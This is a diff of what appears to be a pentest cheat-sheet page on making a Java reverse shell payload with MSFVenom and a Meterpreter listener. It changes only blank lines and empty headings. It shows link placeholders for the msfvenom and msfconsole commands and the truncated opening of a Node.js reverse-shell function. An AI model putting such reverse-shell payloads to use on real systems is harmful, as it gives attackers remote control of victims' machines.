@@ -21,11 +21,21 @@ Generate a Java reverse shell payload with MSFVenom.
 
 Creating a Meterpreter listener with a one liner.
 
+
+
 ## Payload
+
+
 
 **Command**: [[msfvenom JAVA Meterpreter reverse shell]]
 
+
+
+
+
 ## Code Payload
+
+
 
 **Code** ([[(function(){
     var net = require("net"),
@@ -45,11 +55,19 @@ Creating a Meterpreter listener with a one liner.
 })();
 ```
 
+
+
+
+
 ## Listener
+
+
 
 **Command**: [[msfconsole Java Meterpreter Listener]]
 
-## 
+
+
+
 
 ## 
 
@@ -71,4 +89,8 @@ Creating a Meterpreter listener with a one liner.
 
 ## 
 
-##
+## 
+
+## 
+
+
